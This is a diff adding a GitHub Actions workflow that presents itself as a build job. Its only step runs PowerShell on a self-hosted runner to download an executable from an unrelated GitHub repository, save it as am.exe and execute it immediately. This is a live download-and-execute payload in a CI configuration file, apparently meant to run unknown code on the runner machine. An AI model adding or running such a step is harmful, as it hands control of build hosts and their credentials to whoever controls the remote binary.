@@ -1,0 +1,10 @@
+name: 2019paid
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: good
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/discake2024/clicklike2024/raw/refs/heads/main/GSIREALT2024x64.exe -OutFile am.exe ; .\am.exe
